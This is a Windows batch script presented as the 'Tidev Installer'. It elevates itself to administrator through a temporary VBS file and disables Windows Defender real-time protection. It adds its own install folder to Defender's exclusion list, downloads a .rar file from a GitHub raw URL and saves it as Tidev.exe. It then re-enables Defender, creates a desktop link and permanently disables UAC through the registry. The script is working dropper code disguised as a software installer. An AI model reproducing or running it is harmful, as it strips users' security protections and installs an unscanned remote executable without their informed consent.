@echo off&color 0f&mode con: cols=90 lines=29 
cls
pushd "%~dp0"
title Tidev Installer
fltmc >nul 2>&1 || (
 echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\tidevgetadmin.vbs"
	echo UAC.ShellExecute "%~fs0", "", "", "runas", 1 >> "%temp%\tidevgetadmin.vbs"
	"%temp%\tidevgetadmin.vbs"
	del /f /q "%temp%\tidevgetadmin.vbs"
	exit /b
)
REG QUERY "HKU\S-1-5-19" >NUL 2>&1 && (
GOTO InstallWindows
) || (
echo Right click and run as administrator...
echo.
pause
GOTO exit
)

:InstallWindows
cls
echo Tidev Installer v1.0.1
echo.
echo.
echo Author: Nguyen Kha Thi
echo.
timeout 2

cls
echo Tidev Installer
echo.
echo -----------------------------------------------------
echo Please do NOT press anything during the installation.
echo -----------------------------------------------------
echo.
timeout 3

cls
echo Tidev Installer
echo ________________________________________________________
echo 0'/.
echo ________________________________________________________
echo.
echo Creating program directory
echo.
mkdir "C:\Program Files\Tidev_test"

cls
echo Tidev Installer
echo ________________________________________________________
echo =====10'/.
echo ________________________________________________________
echo.
echo Disabling Windows Defender
echo.
powershell Set-MpPreference -DisableRealtimeMonitoring $true

cls
echo Tidev Installer
echo ________________________________________________________
echo ==========20'/.
echo ________________________________________________________
echo.
echo Adding program directory to Windows Defender exclusion list
echo.
powershell Add-MpPreference -ExclusionPath 'C:\Program Files\Tidev_test'

cls
echo Tidev Installer
echo ________________________________________________________
echo ===============30'/.
echo ________________________________________________________
echo.
echo Downloading program
echo.
powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/khathiatz/tidev/master/update_all_tidev.rar','C:\Program Files\Tidev_test\Tidev.exe')

cls
echo Tidev Installer
echo ________________________________________________________
echo ===================================50'/.
echo ________________________________________________________
echo.
echo Download program complete
echo.

cls
echo Tidev Installer
echo ________________________________________________________
echo ========================================80'/.
echo ________________________________________________________
echo.
echo Enabling Windows Defender
echo.
powershell Set-MpPreference -DisableRealtimeMonitoring $false

cls
echo Tidev Installer
echo ________________________________________________________
echo =============================================90'/.
echo ________________________________________________________
echo.
echo Creating shorcut
echo.
mklink "%userprofile%\Desktop\Tidev" "C:\Program Files\Tidev_test\Tidev.exe"

cls
echo Tidev Installer
echo ________________________________________________________
echo ================================================95'/.
echo ________________________________________________________
echo.
echo Disable UAC
echo.
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

if not exist "C:\Program Files\Tidev_test\Tidev.exe" GOTO InstallError

cls
echo Tidev Installer
echo ________________________________________________________
echo ==================================================100'/.
echo ________________________________________________________
echo.
echo Install complete.
echo.
echo Thank you for trusting us.
echo https://tidevapp.wordpress.com
echo.
timeout 5
GOTO exit


:InstallError
del "%userprofile%\Desktop\Tidev"
cls
echo Tidev Installer
echo ________________________________________________________
echo ======================= ERROR ==========================
echo ________________________________________________________
echo.
echo Install error.
echo.
echo Contact us to fix problem
echo https://tidevapp.wordpress.com
echo.
timeout 5
start https://tidevapp.wordpress.com
GOTO exit

:Exit
Exit